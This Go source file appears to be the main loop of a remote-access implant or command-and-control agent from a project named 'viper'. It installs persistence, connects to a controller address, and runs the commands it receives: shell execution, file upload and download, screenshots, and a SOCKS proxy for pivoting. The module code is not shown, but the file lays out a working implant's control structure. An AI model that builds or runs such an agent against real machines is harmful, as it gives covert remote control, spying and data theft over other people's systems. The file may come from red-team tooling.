package main

import (
	"log"
	"viper"
	"viper/agent/controller"
	"viper/agent/modules"
	pb "viper/protos/cmds"

	"google.golang.org/protobuf/proto"
)

func main() {
	err := modules.EnsurePersistence()
	if err != nil {
		log.Fatalf("Failed to persist: %v", err)
	}
	controller := controller.Controller{Addr: viper.Conf.Agent.ControllerAddress}
	controller.Connect()
	for {
		cmdReq, err := controller.ReadCommandRequest()
		if err != nil {
			log.Printf("Failed to read command: %v", err)
			continue
		}
		var resp proto.Message
		switch cmdReq.Type {
		case pb.ECHO_CMD_TYPE:
			resp = modules.RunEchoCommand(cmdReq.GetEchoCommandRequest())
		case pb.SHELL_CMD_TYPE:
			resp = modules.RunShellCommand(cmdReq.GetShellCommandRequest())
		case pb.UPLOAD_FILE_CMD_TYPE:
			resp = modules.DownloadFileFromController(cmdReq.GetUploadFileRequest())
		case pb.DOWNLOAD_FILE_CMD_TYPE:
			resp = modules.UploadFileToController(cmdReq.GetDownloadFileRequest())
		case pb.SCREENSHOT_CMD_TYPE:
			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
		case pb.START_SOCKS_CMD_TYPE:
			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Conn)
		}
		err = controller.WriteCommandResponse(resp)
		if err != nil {
			log.Printf("Failed to write command response: %v", err)
		}
		if cmdReq.Type == pb.START_SOCKS_CMD_TYPE {
			select {}
		}
	}
}
